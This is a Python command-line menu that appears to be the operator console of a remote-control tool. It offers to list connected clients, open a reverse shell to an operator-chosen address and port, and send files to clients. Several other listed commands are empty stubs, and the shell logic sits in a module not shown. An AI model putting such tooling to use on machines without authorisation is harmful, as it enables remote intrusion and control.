#!/usr/bin/python3
from .front import admin
from typing import Coroutine


stayInProgram=True
res=False
commands = ['help','listClients','popShell', 'sendFile', 'reciveFile', 'execProgram', 'install','runComand','exit']

master=admin()

while stayInProgram :
    wait = True
    print (
        "List of commands:" + "\n\n" +
        "0 - help" + "\n" +
        "1 - listClients" +  "\n" +
        "2 - popShell"  + "\n" +
        "3 - sendFile"  + "\n" +
        "4 - reciveFile"  + "\n" +
        "5 - execProgram" +  "\n" +
        "6 - install"  + "\n" +
        "7 - runComand"  + "\n" +
        "8 - exit"  + "\n"
    )
    command = 8;

    try : 
        command = int(input('Enter the number of command:'))
        if (command<0) or (command>8):
            print("The input is not validated\n")
            command = 8;
    except:
        print("The input is not validated\n")


    print ("The command selected is: " + commands[command])

    if (command == 0): #help
        print (
        "\n\nThe program is an administrator of several computers that act as clients of the server where that program is run."  + "\n\n" +
        "0 - help: describe the program and the commands of program " "\n\n" +
        "1 - listClients: list full clients." + "\n\n" + 
        "2 - popShell: runs a reverse shell." + "\n\n" + 
        "3 - sendFile: send a file to the client." + "\n\n" + 
        "4 - reciveFile: pull file from client." + "\n\n" + 
        "5 - execProgram: executable runs on the client machine." + "\n\n" + 
        "6 - install: install client application on client." + "\n\n" + 
        "7 - runComand: run a command on the client machine."  + "\n\n" +
        "8 - exit: disconnects of the server."  + "\n\n"
    )

    elif (command == 1): #listClients
        if(master.displayClients()):
            print("Returned sucessfully")
        else:
            print("Returned Error!!")
        

    
    elif (command == 2): #popShell
        try:
            if not (master.displayClients()):
                raise master

            client = int(input("What client?"))
            print("\n")
            addres = input("what address?")
            print("\n")
            port = int(input("What port?"))
            print("\n")

            if not (master.abrirShell(client,addres,port)):
                raise master
        except:
            print("Returned Error!!")

    elif (command == 3): #sendFile
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")
            file = input("what file?")
            print("\n")

            if not (master.sendFile(file,client)):
                raise master
        except:
            print("Returned Error!!")


    elif (command == 4): #reciveFile
        pass


    elif (command == 5): #execProgram
        pass


    elif (command == 6): #install
        pass


    elif (command == 7): #runComand
        pass


    elif (command == 8): #exit
        stayInProgram = False
        wait = False
    
    else : #comando não descrito, nao deveria acontecer
        stayInProgram = False
        wait = False

    if (wait):
        input("\nPress enter for the next command")
        wait = False


